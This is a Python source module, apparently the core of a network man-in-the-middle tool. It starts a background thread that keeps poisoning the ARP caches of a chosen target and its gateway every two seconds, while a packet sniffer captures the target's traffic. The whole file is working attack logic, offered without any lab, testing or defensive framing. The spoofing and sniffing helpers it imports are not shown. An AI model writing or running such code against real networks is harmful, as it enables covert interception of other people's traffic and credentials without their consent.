import threading
import time
from ..modules import arp_spoofer
from ..modules import sniffer

def _arp_spoof_loop(target_ip, gateway_ip):
    """
    This function will run in a seperate thread.
    This contains an infinite loop to poison the ARP cache
    """

    print("[CORE] the ARP spoof thread has started")

    try:
        while True:
            arp_spoofer.send_spoof_packet(target_ip, gateway_ip)
            arp_spoofer.send_spoof_packet(gateway_ip, target_ip)
            time.sleep(2) # Wait 2 seconds before re-poisoning
    except Exception as e:
        print(f"[ERROR in spoof thread] {e}")

def start_mitm_attack(target_ip, gateway_ip, interface):
    """
    Main MITM attack logic.
    Starts the ARP spoofer in background thread while running packet sniffer in the main thread
    """

    # Background thread for ARP spoofing loop
    # Daemon = True; exit when main program does
    spoof_thread = threading.Thread(
        target=_arp_spoof_loop,
        args=(target_ip, gateway_ip),
        daemon=True
    )

    spoof_thread.start()

    print("[CORE] Starting packet sniffer.")
    filter_string = f"ip host {target_ip}"
    sniffer.start_sniffing(interface, filter_str=filter_string)
